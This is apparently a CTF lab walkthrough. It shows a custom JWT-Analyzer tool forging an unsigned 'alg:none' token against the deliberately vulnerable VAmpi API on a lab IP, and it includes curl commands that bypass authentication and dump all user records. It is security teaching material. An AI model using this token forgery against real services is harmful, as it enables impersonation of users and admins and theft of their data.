# JWT-Analyzer Walkthrough (FinalCTF – AuthScope Tool)

This walkthrough demonstrates how the custom JWT-Analyzer tool was used to analyze and exploit a JWT vulnerability in the VAmpi application.

Screenshots should be placed inside the `/assets/` folder.

---

## 🟩 1. Login to VAmpi & Obtain JWT

Use valid credentials to obtain a JWT:

```bash
curl -X POST http://192.168.56.107:5002/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"reya", "password":"password"}'
```

A valid JWT is returned:

```
eyJhbGciOiJIUzI1NiIs...
```

![Login Screenshot](assets/login.png)

---

## 🟩 2. Analyze the Token Using JWT-Analyzer

Run the analyzer:

```bash
python3 jwt_analyzer.py "<token>"
```

The tool reveals:

- HS256 algorithm (symmetric)
- Claims decoded successfully
- Token is valid
- HS256 may be brute-forceable
- Token structure is modifiable

![Analysis Screenshot](assets/analysis.png)

---

## 🟩 3. Generate the “alg:none” Exploit Token

Use the exploitation flag:

```bash
python3 jwt_analyzer.py "<token>" --generate-none
```

The tool generates an unsigned exploit token:

```
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoicmV5YSJ9.
```

This malicious token:

- Contains no signature  
- Uses `"alg": "none"`  
- Can bypass insecure JWT validation  

![None Algorithm Token Screenshot](assets/none_token.png)

---

## 🟩 4. Use Exploit Token to Bypass Authentication

Send the unsigned token to a protected endpoint:

```bash
curl -X GET http://192.168.56.107:5002/users/v1 \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoicmV5YSJ9."
```

The server returns **all user records**, including admin — confirming authentication bypass.

![Bypass Screenshot](assets/bypass.png)

---

## 🟩 5. Exploit Result Summary

JWT-Analyzer successfully demonstrated:

- Weak JWT implementation  
- Acceptance of unsigned tokens (`alg:none`)  
- Full authentication bypass  
- Unauthorized user enumeration  

### **Impact**
An attacker can impersonate any user, including admins, and access protected data without knowing the signing key.

---

